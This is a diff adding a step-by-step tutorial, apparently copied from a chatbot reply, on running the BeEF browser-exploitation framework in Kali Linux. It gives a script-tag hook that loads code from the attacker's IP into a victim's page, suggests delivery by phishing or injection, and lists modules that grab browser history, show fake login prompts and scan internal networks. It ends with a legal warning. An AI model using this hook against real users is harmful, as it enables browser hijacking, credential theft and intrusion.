@@ -1,0 +1,86 @@
+🔧 Step-by-Step: Using BeEF in Kali Linux
+✅ Step 1: Start BeEF
+Open your terminal and run:
+
+bash
+Copy
+Edit
+beef-xss
+It will start the BeEF server and display important login info like:
+
+UI URL: http://127.0.0.1:3000/ui/panel
+
+Username: beef
+
+Password: beef
+
+Note: If BeEF doesn't start, try:
+
+bash
+Copy
+Edit
+sudo service apache2 start
+✅ Step 2: Open the Web Interface
+Open Firefox or Chromium in Kali.
+
+Navigate to:
+
+arduino
+Copy
+Edit
+http://127.0.0.1:3000/ui/panel
+Login with:
+
+makefile
+Copy
+Edit
+Username: beef
+Password: beef
+✅ Step 3: Hook a Browser
+To "hook" a victim browser, you need to inject the BeEF JavaScript hook code into a webpage:
+
+html
+Copy
+Edit
+<script src="http://<your-ip>:3000/hook.js"></script>
+Ways to hook:
+
+Inject it into a test site you control.
+
+Use phishing or social engineering.
+
+Modify vulnerable web pages (in a lab environment).
+
+📌 Example:
+Send your victim a malicious HTML page with the hook code.
+
+✅ Step 4: Wait for Victim to Connect
+Once a browser opens the malicious page, it will appear under "Hooked Browsers" in the BeEF panel.
+
+✅ Step 5: Use BeEF Modules
+Click on the hooked browser → Go to "Commands" tab → Choose modules like:
+
+Get Geolocation
+
+Alert box
+
+Grab browser history
+
+Social engineering (Fake login prompt, etc.)
+
+Network recon (internal IPs, routers, etc.)
+
+BeEF will run the selected command in the victim’s browser.
+
+✅ Step 6: Analyze Results
+Use the Logs tab to view results of commands and browser behaviors.
+
+⚙️ Tips:
+Use BeEF in lab or legal testing environments only.
+
+Run ifconfig or ip a to find your local IP for the hook URL.
+
+Combine with Social Engineering Toolkit (SET) for phishing attacks.
+
+🚫 Legal Warning:
+BeEF is a powerful hacking tool and must only be used with explicit permission. Unauthorized use is illegal and unethical.
